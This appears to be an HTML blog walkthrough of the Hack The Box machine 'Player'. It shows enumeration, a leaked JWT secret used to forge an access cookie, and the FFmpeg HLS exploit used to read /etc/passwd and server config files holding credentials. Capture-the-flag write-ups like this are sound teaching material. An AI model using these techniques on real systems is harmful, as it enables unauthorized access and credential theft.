<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.5.0 -->
<title>Hack The Box - Player | 0xRick</title>
<meta name="generator" content="Jekyll v3.8.5" />
<meta property="og:title" content="Hack The Box - Player" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="My write-up / walkthrough for Player from Hack The Box." />
<meta property="og:description" content="My write-up / walkthrough for Player from Hack The Box." />
<link rel="canonical" href="https://0xrick.github.io/hack-the-box/player/" />
<meta property="og:url" content="https://0xrick.github.io/hack-the-box/player/" />
<meta property="og:site_name" content="0xRick" />
<meta property="og:image" content="https://0xrick.github.io/hackthebox/player/0.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2020-01-18T00:00:00+02:00" />
<script type="application/ld+json">
{"description":"My write-up / walkthrough for Player from Hack The Box.","@type":"BlogPosting","url":"https://0xrick.github.io/hack-the-box/player/","image":"https://0xrick.github.io/hackthebox/player/0.png","headline":"Hack The Box - Player","dateModified":"2020-01-18T00:00:00+02:00","datePublished":"2020-01-18T00:00:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://0xrick.github.io/hack-the-box/player/"},"@context":"http://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/ad.css">
  <link rel="stylesheet" href="/assets/css/style.css">
  <link rel="icon" type="image/png" href="/assets/favicon.png" /><link type="application/atom+xml" rel="alternate" href="https://0xrick.github.io/feed.xml" title="0xRick" /><script defer src="https://use.fontawesome.com/releases/v5.8.1/js/all.js" integrity="sha384-g5uSoOSBd7KkhAMlnQILrecXvzst9TdC09/VM+pjDTCM+1il8RHz5fKANTFFb+gQ" crossorigin="anonymous"></script>
</head><!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-97164925-2');
</script>

<body><div class="site-header">
  <div class="wrapper">
    <a class="site-title" rel="author" href="/">0xRick<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
    <span class="social_links">
        <a class="color-cyan-hover" href="https://twitter.com/Ahm3d_H3sham/" target="_blank" rel="noopener noreferrer"><i class="fab fa-twitter"></i></a><a class="color-blue-hover" href="https://facebook.com/Ahm3d.H3sham/" target="_blank" rel="noopener noreferrer"><i class="fab fa-facebook"></i></a><a class="color-purple-hover" href="https://github.com/0xRick" target="_blank" rel="noopener noreferrer"><i class="fab fa-github"></i></a><a class="color-orange-hover" href="https://www.reddit.com/user/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer"><i class="fab fa-reddit"></i></a><a class="color-cyan-hover" href="https://discordapp.com/users/332196573771595777" target="_blank" rel="noopener noreferrer"><i class="fab fa-discord"></i></a>
        <a class="color-red-hover" href="mailto:x0rick@protonmail.com"><i class="fa fa-envelope"></i></a>
    </span>
  </div>
</div>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <div class="author-box">
<img src="/avatar.jpg" width="256px" height="256px" class="author-avatar" onclick="window.open('https://www.hackthebox.eu/profile/65598','_blank');">
<h7>
	Ahmed Hesham<br>
	CyberSec/InfoSec enthusiast. <br>
	Interested in knowing how things work/Interested in breaking them, always learning.
</h7>
</div>

  <br>
<div>
	<h7>    Ad </h7>
	<script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&amp;placement=0xrickgithubio" id="_carbonads_js"></script>
</div>
<div class="post">
  <h1 class="post-title">Hack The Box - Player</h1>
  
  <div class="post-tags">
      
      <a class="tag" href="/tag/linux/">linux</a>
      
      <a class="tag" href="/tag/web/">web</a>
      
      <a class="tag" href="/tag/ssh/">ssh</a>
      
      <a class="tag" href="/tag/rce/">rce</a>
      
      <a class="tag" href="/tag/php/">php</a>
      
      <a class="tag" href="/tag/jwt/">jwt</a>
      
      <a class="tag" href="/tag/code-analysis/">code-analysis</a>
      
  </div>
  
  <div class="post-date">Published on 18 Jan 2020</div>
  
  <div class="post-description">My write-up / walkthrough for Player from Hack The Box.</div>
  
  <hr>

<h2 id="quick-summary">Quick Summary</h2>
<p><br>Hey guys, today Player retired and here’s my write-up about it. It was a relatively hard CTF-style machine with a lot of enumeration and a couple of interesting exploits. It’s a Linux box and its ip is <code class="highlighter-rouge">10.10.10.145</code>, I added it to <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">player.htb</code>. Let’s jump right in !
<br>
<img src="/images/hackthebox/player/0.png" alt="">
<br></p>
<hr>

<h2 id="nmap">Nmap</h2>
<p><br>As always we will start with <code class="highlighter-rouge">nmap</code> to scan for open ports and services:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/player# nmap -sV -sT -sC -o nmapinitial player.htb 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-17 16:29 EST
Nmap scan report for player.htb (10.10.10.145)
Host is up (0.35s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 d7:30:db:b9:a0:4c:79:94:78:38:b3:43:a2:50:55:81 (DSA)
|   2048 37:2b:e4:31:ee:a6:49:0d:9f:e7:e6:01:e6:3e:0a:66 (RSA)
|   256 0c:6c:05:ed:ad:f1:75:e8:02:e4:d2:27:3e:3a:19:8f (ECDSA)
|_  256 11:b8:db:f3:cc:29:08:4a:49:ce:bf:91:73:40:a2:80 (ED25519)
80/tcp open  http    Apache httpd 2.4.7
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: 403 Forbidden
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 75.12 seconds
root@kali:~/Desktop/HTB/boxes/player# 
</code></pre></div></div>
<p><br>We got <code class="highlighter-rouge">http</code> on port 80 and <code class="highlighter-rouge">ssh</code> on port 22.
<br></p>
<hr>

<h2 id="web-enumeration">Web Enumeration</h2>
<p><br>I got a 403 response when I went to <code class="highlighter-rouge">http://player.htb/</code>:<br>
<img src="/images/hackthebox/player/1.png" alt="">
<br><br>I used <code class="highlighter-rouge">wfuzz</code> with <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1million-5000.txt" target="_blank" rel="noopener noreferrer"><code class="highlighter-rouge">subdomains-top1mil-5000.txt</code></a> from <a href="https://github.com/danielmiessler/SecLists" target="_blank" rel="noopener noreferrer"><code class="highlighter-rouge">seclists</code></a> to enumerate virtual hosts and got these results:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/player# wfuzz --hc 403 -c -w subdomains-top1mil-5000.txt -H "HOST: FUZZ.player.htb" http://10.10.10.145

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4 - The Web Fuzzer                           *
********************************************************
Target: http://10.10.10.145/
Total requests: 4997
===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================
000000019:   200        86 L     229 W    5243 Ch     "dev"
000000067:   200        63 L     180 W    1470 Ch     "staging"
000000070:   200        259 L    714 W    9513 Ch     "chat"

Total time: 129.1540
Processed Requests: 4997
Filtered Requests: 4994
Requests/sec.: 38.69021

root@kali:~/Desktop/HTB/boxes/player# 
</code></pre></div></div>
<p><br>I added them to my hosts file and started checking each one of them.
<br>On <code class="highlighter-rouge">dev</code> there was an application that needed credentials so we’ll skip that one until we find some credentials:<br>
<img src="/images/hackthebox/player/2.png" alt="">
<br><br><code class="highlighter-rouge">staging</code> was kinda empty but there was an interesting contact form:<br>
<img src="/images/hackthebox/player/3.png" alt="">
<br><br>
<img src="/images/hackthebox/player/4.png" alt="">
<br><br>
<img src="/images/hackthebox/player/5.png" alt="">
<br><br>The form was interesting because when I attempted to submit it I got a weird error for a second then I got redirected to <code class="highlighter-rouge">/501.php</code>:<br>
<img src="/images/hackthebox/player/6.png" alt="">
<br><br>
<img src="/images/hackthebox/player/7.png" alt="">
<br><br>I intercepted the request with burp to read the error.
<br>Request:</p>
<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/contact.php?firstname=test&amp;subject=test</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">staging.player.htb</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Referer</span><span class="p">:</span> <span class="s">http://staging.player.htb/contact.html</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
</code></pre></div></div>
<p><br>Response:</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="mi">200</span> <span class="nx">OK</span>
<span class="nx">Date</span><span class="o">:</span> <span class="nx">Fri</span><span class="p">,</span> <span class="mi">17</span> <span class="nx">Jan</span> <span class="mi">2020</span> <span class="mi">19</span><span class="o">:</span><span class="mi">54</span><span class="o">:</span><span class="mi">33</span> <span class="nx">GMT</span>
<span class="nx">Server</span><span class="o">:</span> <span class="nx">Apache</span><span class="o">/</span><span class="mf">2.4</span><span class="o">.</span><span class="mi">7</span> <span class="p">(</span><span class="nx">Ubuntu</span><span class="p">)</span>
<span class="nx">X</span><span class="o">-</span><span class="nx">Powered</span><span class="o">-</span><span class="nx">By</span><span class="o">:</span> <span class="nx">PHP</span><span class="o">/</span><span class="mf">5.5</span><span class="o">.</span><span class="mi">9</span><span class="o">-</span><span class="mi">1</span><span class="nx">ubuntu4</span><span class="o">.</span><span class="mi">26</span>
<span class="nx">refresh</span><span class="o">:</span> <span class="mi">0</span><span class="p">;</span><span class="nx">url</span><span class="o">=</span><span class="mf">501.</span><span class="nx">php</span>
<span class="nx">Vary</span><span class="o">:</span> <span class="nx">Accept</span><span class="o">-</span><span class="nx">Encoding</span>
<span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span> <span class="mi">818</span>
<span class="nx">Connection</span><span class="o">:</span> <span class="nx">close</span>
<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span> <span class="nx">text</span><span class="o">/</span><span class="nx">html</span>

<span class="k">array</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
  <span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=&gt;</span>
  <span class="k">array</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
    <span class="p">[</span><span class="s2">"file"</span><span class="p">]</span><span class="o">=&gt;</span>
    <span class="nx">string</span><span class="p">(</span><span class="mi">28</span><span class="p">)</span> <span class="s2">"/var/www/staging/contact.php"</span>
    <span class="p">[</span><span class="s2">"line"</span><span class="p">]</span><span class="o">=&gt;</span>
    <span class="nx">int</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
    <span class="p">[</span><span class="s2">"function"</span><span class="p">]</span><span class="o">=&gt;</span>
    <span class="nx">string</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="s2">"c"</span>
    <span class="p">[</span><span class="s2">"args"</span><span class="p">]</span><span class="o">=&gt;</span>
    <span class="k">array</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
      <span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=&gt;</span>
      <span class="o">&amp;</span><span class="nx">string</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span> <span class="s2">"Cleveland"</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=&gt;</span>
  <span class="k">array</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
    <span class="p">[</span><span class="s2">"file"</span><span class="p">]</span><span class="o">=&gt;</span>
    <span class="nx">string</span><span class="p">(</span><span class="mi">28</span><span class="p">)</span> <span class="s2">"/var/www/staging/contact.php"</span>
    <span class="p">[</span><span class="s2">"line"</span><span class="p">]</span><span class="o">=&gt;</span>
    <span class="nx">int</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
    <span class="p">[</span><span class="s2">"function"</span><span class="p">]</span><span class="o">=&gt;</span>
    <span class="nx">string</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="s2">"b"</span>
    <span class="p">[</span><span class="s2">"args"</span><span class="p">]</span><span class="o">=&gt;</span>
    <span class="k">array</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
      <span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=&gt;</span>
      <span class="o">&amp;</span><span class="nx">string</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="s2">"Glenn"</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">=&gt;</span>
  <span class="k">array</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
    <span class="p">[</span><span class="s2">"file"</span><span class="p">]</span><span class="o">=&gt;</span>
    <span class="nx">string</span><span class="p">(</span><span class="mi">28</span><span class="p">)</span> <span class="s2">"/var/www/staging/contact.php"</span>
    <span class="p">[</span><span class="s2">"line"</span><span class="p">]</span><span class="o">=&gt;</span>
    <span class="nx">int</span><span class="p">(</span><span class="mi">11</span><span class="p">)</span>
    <span class="p">[</span><span class="s2">"function"</span><span class="p">]</span><span class="o">=&gt;</span>
    <span class="nx">string</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="s2">"a"</span>
    <span class="p">[</span><span class="s2">"args"</span><span class="p">]</span><span class="o">=&gt;</span>
    <span class="k">array</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
      <span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=&gt;</span>
      <span class="o">&amp;</span><span class="nx">string</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="s2">"Peter"</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="nx">Database</span> <span class="nx">connection</span> <span class="nx">failed</span><span class="o">.&lt;</span><span class="nx">html</span><span class="o">&gt;&lt;</span><span class="nx">br</span> <span class="o">/&gt;</span><span class="nx">Unknown</span> <span class="nx">variable</span> <span class="nx">user</span> <span class="nx">in</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nx">www</span><span class="o">/</span><span class="nx">backup</span><span class="o">/</span><span class="nx">service_config</span> <span class="nx">fatal</span> <span class="nx">error</span> <span class="nx">in</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nx">www</span><span class="o">/</span><span class="nx">staging</span><span class="o">/</span><span class="nx">fix</span><span class="o">.</span><span class="nx">php</span>
</code></pre></div></div>
<p><br>The error exposed some filenames like <code class="highlighter-rouge">/var/www/backup/service_config</code>, <code class="highlighter-rouge">/var/www/staging/fix.php</code> and <code class="highlighter-rouge">/var/www/staging/contact.php</code>. That will be helpful later.
<br><code class="highlighter-rouge">chat</code> was a static page that simulated a chat application:<br>
<img src="/images/hackthebox/player/8.png" alt="">
<br><br> I took a quick look at the chat history between Olla and Vincent, Olla asked him about some pentest reports and he replied with 2 interesting things :<br>
<img src="/images/hackthebox/player/9.png" alt="">
<br><br>
<img src="/images/hackthebox/player/10.png" alt="">
<br><br></p>
<ol>
  <li>Staging exposing sensitive files.</li>
  <li>Main domain exposing source code allowing to access the product before release.</li>
</ol>

<p><br>We already saw that <code class="highlighter-rouge">staging</code> was exposing files, I ran <code class="highlighter-rouge">gobuster</code> on the main domain and found <code class="highlighter-rouge">/launcher</code>:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/player# gobuster dir -u http://player.htb/ -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://player.htb/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/01/17 19:17:29 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/launcher (Status: 301)
/server-status (Status: 403)
===============================================================
2020/01/17 19:18:59 Finished
===============================================================
root@kali:~/Desktop/HTB/boxes/player# 
</code></pre></div></div>
<p><br><code class="highlighter-rouge">http://player.htb/launcher</code>:<br>
<img src="/images/hackthebox/player/11.png" alt="">
<br><br>I tried to submit that form but it did nothing, I just got redirected to <code class="highlighter-rouge">/launcher</code> again:
<br>Request:</p>
<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/launcher/dee8dc8a47256c64630d803a4c40786c.php</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">player.htb</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Referer</span><span class="p">:</span> <span class="s">http://player.htb/launcher/index.html</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">access=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwcm9qZWN0IjoiUGxheUJ1ZmYiLCJhY2Nlc3NfY29kZSI6IkMwQjEzN0ZFMkQ3OTI0NTlGMjZGRjc2M0NDRTQ0NTc0QTVCNUFCMDMifQ.cjGwng6JiMiOWZGz7saOdOuhyr1vad5hAxOJCiM3uzU</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
</code></pre></div></div>
<p><br>Response:</p>
<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">302</span> <span class="ne">Found</span>
<span class="na">Date</span><span class="p">:</span> <span class="s">Fri, 17 Jan 2020 22:45:04 GMT</span>
<span class="na">Server</span><span class="p">:</span> <span class="s">Apache/2.4.7 (Ubuntu)</span>
<span class="na">X-Powered-By</span><span class="p">:</span> <span class="s">PHP/5.5.9-1ubuntu4.26</span>
<span class="na">Location</span><span class="p">:</span> <span class="s">index.html</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">0</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html</span>
</code></pre></div></div>
<p><br>We know from the chat that the source code is exposed somewhere, I wanted to read the source of <code class="highlighter-rouge">/launcher/dee8dc8a47256c64630d803a4c40786c.php</code> so I tried some basic stuff like adding <code class="highlighter-rouge">.swp</code>, <code class="highlighter-rouge">.bak</code> and <code class="highlighter-rouge">~</code> after the file name. <code class="highlighter-rouge">~</code> worked (check <a href="https://superuser.com/questions/546146/what-does-a-mean-after-a-file-name-in-unix-bash" target="_blank" rel="noopener noreferrer">this</a> out):</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/player# curl http://player.htb/launcher/dee8dc8a47256c64630d803a4c40786c.php~
<span class="cp">&lt;?php</span>
<span class="k">require</span> <span class="s1">'vendor/autoload.php'</span><span class="p">;</span>

<span class="k">use</span> <span class="nx">\Firebase\JWT\JWT</span><span class="p">;</span>

<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s2">"access"</span><span class="p">]))</span>
<span class="p">{</span>
        <span class="nv">$key</span> <span class="o">=</span> <span class="s1">'_S0_R@nd0m_P@ss_'</span><span class="p">;</span>
        <span class="nv">$decoded</span> <span class="o">=</span> <span class="nx">JWT</span><span class="o">::</span><span class="na">decode</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s2">"access"</span><span class="p">],</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nb">strtr</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="s1">'-_'</span><span class="p">,</span> <span class="s1">'+/'</span><span class="p">)),</span> <span class="p">[</span><span class="s1">'HS256'</span><span class="p">]);</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$decoded</span><span class="o">-&gt;</span><span class="na">access_code</span> <span class="o">===</span> <span class="s2">"0E76658526655756207688271159624026011393"</span><span class="p">)</span>
        <span class="p">{</span>
                <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: 7F2xxxxxxxxxxxxx/"</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">else</span>
        <span class="p">{</span>
                <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: index.html"</span><span class="p">);</span>
        <span class="p">}</span>
<span class="p">}</span>
<span class="k">else</span>
<span class="p">{</span>
        <span class="nv">$token_payload</span> <span class="o">=</span> <span class="p">[</span>
          <span class="s1">'project'</span> <span class="o">=&gt;</span> <span class="s1">'PlayBuff'</span><span class="p">,</span>
          <span class="s1">'access_code'</span> <span class="o">=&gt;</span> <span class="s1">'C0B137FE2D792459F26FF763CCE44574A5B5AB03'</span>
        <span class="p">];</span>
        <span class="nv">$key</span> <span class="o">=</span> <span class="s1">'_S0_R@nd0m_P@ss_'</span><span class="p">;</span>
        <span class="nv">$jwt</span> <span class="o">=</span> <span class="nx">JWT</span><span class="o">::</span><span class="na">encode</span><span class="p">(</span><span class="nv">$token_payload</span><span class="p">,</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nb">strtr</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="s1">'-_'</span><span class="p">,</span> <span class="s1">'+/'</span><span class="p">)),</span> <span class="s1">'HS256'</span><span class="p">);</span>
        <span class="nv">$cookiename</span> <span class="o">=</span> <span class="s1">'access'</span><span class="p">;</span>
        <span class="nb">setcookie</span><span class="p">(</span><span class="s1">'access'</span><span class="p">,</span><span class="nv">$jwt</span><span class="p">,</span> <span class="nb">time</span><span class="p">()</span> <span class="o">+</span> <span class="p">(</span><span class="mi">86400</span> <span class="o">*</span> <span class="mi">30</span><span class="p">),</span> <span class="s2">"/"</span><span class="p">);</span>
        <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: index.html"</span><span class="p">);</span>
<span class="p">}</span>

<span class="cp">?&gt;</span>
root@kali:~/Desktop/HTB/boxes/player#
</code></pre></div></div>
<p><br>It decodes the <code class="highlighter-rouge">JWT</code> token from the cookie <code class="highlighter-rouge">access</code> and redirects us to a redacted path if the value of <code class="highlighter-rouge">access_code</code> was <code class="highlighter-rouge">0E76658526655756207688271159624026011393</code>, otherwise it will assign an <code class="highlighter-rouge">access</code> cookie for us with <code class="highlighter-rouge">C0B137FE2D792459F26FF763CCE44574A5B5AB03</code> as the value of <code class="highlighter-rouge">access_code</code> and redirect us to <code class="highlighter-rouge">index.html</code>. 
<br>We have the secret <code class="highlighter-rouge">_S0_R@nd0m_P@ss_</code> so we can easily craft a valid cookie. I used <a href="https://jwt.io/" target="_blank" rel="noopener noreferrer">jwt.io</a> to edit my token. <br>
<img src="/images/hackthebox/player/12.png" alt="">
<br><br>
<img src="/images/hackthebox/player/13.png" alt="">
<br><br>I used the cookie and got redirected to <code class="highlighter-rouge">/7F2dcsSdZo6nj3SNMTQ1</code>:
<br>Request:</p>
<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/launcher/dee8dc8a47256c64630d803a4c40786c.php</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">player.htb</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Referer</span><span class="p">:</span> <span class="s">http://player.htb/launcher/index.html</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">access=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwcm9qZWN0IjoiUGxheUJ1ZmYiLCJhY2Nlc3NfY29kZSI6IjBFNzY2NTg1MjY2NTU3NTYyMDc2ODgyNzExNTk2MjQwMjYwMTEzOTMifQ.VXuTKqw__J4YgcgtOdNDgsLgrFjhN1_WwspYNf_FjyE</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
</code></pre></div></div>
<p><br>Response:</p>
<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">302</span> <span class="ne">Found</span>
<span class="na">Date</span><span class="p">:</span> <span class="s">Fri, 17 Jan 2020 22:50:59 GMT</span>
<span class="na">Server</span><span class="p">:</span> <span class="s">Apache/2.4.7 (Ubuntu)</span>
<span class="na">X-Powered-By</span><span class="p">:</span> <span class="s">PHP/5.5.9-1ubuntu4.26</span>
<span class="na">Location</span><span class="p">:</span> <span class="s">7F2dcsSdZo6nj3SNMTQ1/</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">0</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html</span>
</code></pre></div></div>
<p><br>
<img src="/images/hackthebox/player/14.png" alt="">
<br></p>
<hr>

<h2 id="ffmpeg-hls-vulnerability--arbitrary-file-read">FFmpeg HLS Vulnerability –&gt; Arbitrary File Read</h2>
<p><br>I uploaded a test <code class="highlighter-rouge">txt</code> file:<br>
<img src="/images/hackthebox/player/15.png" alt="">
<br><br>
<img src="/images/hackthebox/player/16.png" alt="">
<br><br>I got an <code class="highlighter-rouge">avi</code> file as a result which was weird:</p>
<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"http:\/\/player.htb/launcher/7F2dcsSdZo6nj3SNMTQ1/uploads/518515582.avi"</span><span class="nt">&gt;</span>
</code></pre></div></div>
<p><br>I tried some other file formats and I also got an <code class="highlighter-rouge">avi</code> file.
<br>So I tried the <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS" target="_blank" rel="noopener noreferrer"><code class="highlighter-rouge">ffmpeg HLS</code> exploit</a>, I created a test <code class="highlighter-rouge">avi</code> to read <code class="highlighter-rouge">/etc/passwd</code> and it worked:<br></p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/player/avi# ./gen_xbin_avi.py file:///etc/passwd test.avi
root@kali:~/Desktop/HTB/boxes/player/avi# file test.avi 
test.avi: RIFF (little-endian) data, AVI, 224 x 160, 25.00 fps,
root@kali:~/Desktop/HTB/boxes/player/avi#
</code></pre></div></div>
<p><br>
<img src="/images/hackthebox/player/17.png" alt="">
<br><br>I created 3 more <code class="highlighter-rouge">avi</code>s to read the files we got earlier from the error message from <code class="highlighter-rouge">staging</code>:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/player/avi# ./gen_xbin_avi.py file:///var/www/staging/contact.php contact.avi
root@kali:~/Desktop/HTB/boxes/player/avi# ./gen_xbin_avi.py file:///var/www/backup/service_config service_config.avi
root@kali:~/Desktop/HTB/boxes/player/avi# ./gen_xbin_avi.py file:///var/www/staging/fix.php fix.avi
root@kali:~/Desktop/HTB/boxes/player/avi#
</code></pre></div></div>
<p><br><code class="highlighter-rouge">contact.php</code> didn’t have anything interesting and the <code class="highlighter-rouge">avi</code> for <code class="highlighter-rouge">fix.php</code> was empty for some reason. In <code class="highlighter-rouge">service_config</code> there were some credentials for a user called <code class="highlighter-rouge">telegen</code>:<br>
<img src="/images/hackthebox/player/18.png" alt="">
